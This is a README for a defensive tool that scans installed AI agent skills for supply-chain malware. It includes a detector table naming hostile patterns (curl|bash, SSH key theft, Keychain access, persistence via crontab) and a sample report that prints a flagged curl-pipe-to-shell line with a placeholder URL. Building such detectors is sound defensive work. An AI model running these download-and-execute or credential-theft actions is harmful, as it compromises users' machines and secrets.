# Skill Security Audit

> Detect malicious patterns in your AI Agent skills before they steal your SSH keys.

Based on [SlowMist's analysis](https://mp.weixin.qq.com/s/mH2kApjTgBw6iskh-HBFNQ) of **472+ malicious skills** discovered on the ClawHub platform, this tool scans your installed skills for backdoors, credential theft, data exfiltration, and other supply-chain attacks.

## Install

```bash
npx skills add smartchainark/skill-security-audit
```

Supports **39 AI Agent platforms** including Claude Code, OpenClaw, Codex, Gemini CLI, GitHub Copilot, Cursor, Cline, and more.

## Use

In Claude Code, just say:

- "安全审计" / "security audit"
- "scan skills" / "skill 检查"

Or run manually:

```bash
python3 ~/.claude/skills/skill-security-audit/scripts/skill_audit.py
python3 ~/.claude/skills/skill-security-audit/scripts/skill_audit.py --path /path/to/skill
python3 ~/.claude/skills/skill-security-audit/scripts/skill_audit.py --json
python3 ~/.claude/skills/skill-security-audit/scripts/skill_audit.py --severity high
```

## What It Detects

**13 detectors** covering the full attack surface:

| Detector | What It Catches | Severity |
|----------|----------------|----------|
| `DownloadExecDetector` | `curl\|bash`, `wget\|sh`, fetch+eval | **CRITICAL** |
| `IOCMatchDetector` | Known malicious IPs, domains, URLs, file hashes | **CRITICAL** |
| `CredentialTheftDetector` | osascript password phishing, Keychain access, SSH key theft | **CRITICAL** |
| `PostInstallHookDetector` | npm `postinstall`, pip `setup.py cmdclass` | **HIGH→CRITICAL** |
| `ObfuscationDetector` | `eval`/`exec` with non-literal args, hex encoding, `chr()` chains | **HIGH** |
| `ExfiltrationDetector` | ZIP + upload combos, sensitive directory enumeration | **HIGH** |
| `PersistenceDetector` | crontab, launchd plist, systemd service, shell profile writes | **HIGH** |
| `PrivilegeEscalationDetector` | `sudo`, `chmod 777`, `setuid` | **HIGH** |
| `Base64Detector` | Encoded strings >50 chars (excludes `data:image`, lock files) | **MEDIUM→HIGH** |
| `EntropyDetector` | High Shannon entropy lines (>5.5, adjusted for CJK) | **MEDIUM** |
| `NetworkCallDetector` | socket, http, urllib, requests, fetch, curl, wget | **MEDIUM** |
| `HiddenCharDetector` | Zero-width characters, Unicode bidi overrides (Trojan Source) | **MEDIUM** |
| `SocialEngineeringDetector` | crypto/wallet/airdrop/security-update naming | **LOW→MEDIUM** |

Each finding includes severity, confidence score (0-100), file path with line number, and plain-language description.

## Sample Output

```
======================================================================
  SKILL SECURITY AUDIT REPORT
  Scanned: 39 skills, 338 files
======================================================================

  Summary: CRITICAL: 0  |  HIGH: 2  |  MEDIUM: 5  |  LOW: 1

  Skill: suspicious-helper

    [CRITICAL] DownloadExecDetector
      File: scripts/setup.sh:14
      Download-and-execute pattern: curl pipe to shell
      Confidence: 95%
      > curl -s https://rentry.co/raw/xxxxx | bash
======================================================================
```

## Exit Codes

| Code | Meaning |
|------|---------|
| `0` | Clean |
| `1` | Low/Medium risk |
| `2` | High risk |
| `3` | Critical |
| `4` | Scanner error |

## Design

- **Zero dependencies** — Pure Python stdlib, works with Python 3.8+
- **External IOC database** — `scripts/ioc_database.json`, update without code changes
- **Confidence scoring** — 0-100 per finding, reduces false positive fatigue
- **Smart exclusions** — Lock files, `data:image`, CJK text, `.md` docs, `venv/node_modules`
- **Auto-discovery** — Scans `~/.claude/skills/`, `~/.openclaw/workspace/skills/`, and openclaw.json extraDirs

## Contributing

PRs welcome — new detectors, IOC updates, false positive fixes.

## Credits

- **[SlowMist Security Team](https://mp.weixin.qq.com/s/mH2kApjTgBw6iskh-HBFNQ)** — Threat intelligence and IOC data
- **Poseidon Group TTPs** — Attack pattern documentation

## License

MIT
